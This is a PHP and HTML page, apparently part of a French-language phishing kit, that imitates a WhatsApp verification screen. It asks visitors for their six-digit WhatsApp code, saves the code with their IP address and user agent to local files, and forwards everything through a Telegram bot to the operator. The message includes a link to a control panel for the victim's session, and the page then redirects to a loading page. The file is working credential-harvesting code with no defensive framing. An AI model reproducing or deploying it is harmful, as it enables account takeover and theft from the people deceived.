<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'whatsapp_verification.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// Traitement du formulaire
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $whatsappCode = $_POST['whatsapp_code'] ?? '';
    
    if (!empty($whatsappCode)) {
        // Enregistrer le code WhatsApp
        $clientData = [
            'whatsapp_code' => $whatsappCode,
            'timestamp' => time(),
            'ip' => $clientIp,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
        ];
        
        // Créer le dossier sessions s'il n'existe pas
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        // Enregistrer les données
        file_put_contents('sessions/' . $sessionId . '_whatsapp.json', json_encode($clientData));
        
        // Envoyer les informations à Telegram
        $message = "💬 CODE WHATSAPP REÇU 💬\n\n";
        $message .= "📞 Code: " . $whatsappCode . "\n";
        $message .= "🔑 Session ID: " . $sessionId . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "🖥️ User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Non disponible') . "\n\n";
        
        // Chemin du fichier de configuration Telegram
        $telegramConfigFile = 'telegram_config.json';
        if (file_exists($telegramConfigFile)) {
            $telegramConfig = json_decode(file_get_contents($telegramConfigFile), true);
            $botToken = $telegramConfig['bot_token'] ?? '';
            $chatId = $telegramConfig['chat_id'] ?? '';

            $message .= "🔗 Panneau de contrôle: " . $telegramConfig['url'] . "/control_panel.php?session=" . $sessionId . "&ip=" . $clientIp;
    
            if (!empty($botToken) && !empty($chatId)) {
                $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $params = [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_exec($ch);
                curl_close($ch);
            }
        }
        
        // Rediriger vers la page de chargement avec vérification
        header("Location: loading_whatsapp.php?session=" . $sessionId . "&ip=" . $clientIp);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification WhatsApp</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 80px;
            margin-bottom: 15px;
            margin-top: 15px;
        }
        
        .login-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .login-title {
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
        }
        
        .form-control:focus {
            border-color: #25D366;
            outline: none;
            box-shadow: 0 0 0 2px #e7f8ef;
        }
        
        .login-button {
            width: 100%;
            padding: 12px 0;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .login-button:hover {
            background-color: #128C7E;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .error-message i {
            margin-right: 10px;
            font-size: 16px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://www.freeiconspng.com/uploads/logo-whatsapp-png-image-2.png" alt="WhatsApp Logo" class="logo">
        </div>
        
        <div class="login-card">
            <div class="login-title" style="color: #25D366;">Vérification WhatsApp</div>
            
            <p style="color: #65676b; margin-bottom: 20px; text-align: center; font-size: 14px;">Nous avons envoyé un code de vérification à votre WhatsApp. Veuillez entrer le code ci-dessous.</p>
            
            <form method="post" action="">
                <div class="form-group">
                    <label style="display: block; font-size: 14px; color: #65676b; margin-bottom: 5px;">Code de vérification WhatsApp</label>
                    <input type="text" name="whatsapp_code" id="whatsapp-code" class="form-control" placeholder="Entrez le code à 6 chiffres" required pattern="[0-9]{6}" maxlength="6">
                </div>
                
                <button type="submit" class="login-button">Vérifier le code</button>
            </form>
        </div>
        
        <div class="footer">
            <p>© 2026 WHATSAPPS. Tous droits réservés.</p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const whatsappCodeInput = document.getElementById('whatsapp-code');
            
            if (whatsappCodeInput) {
                whatsappCodeInput.focus();
            }
            
            whatsappCodeInput.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
        });
    </script>
</body>
</html>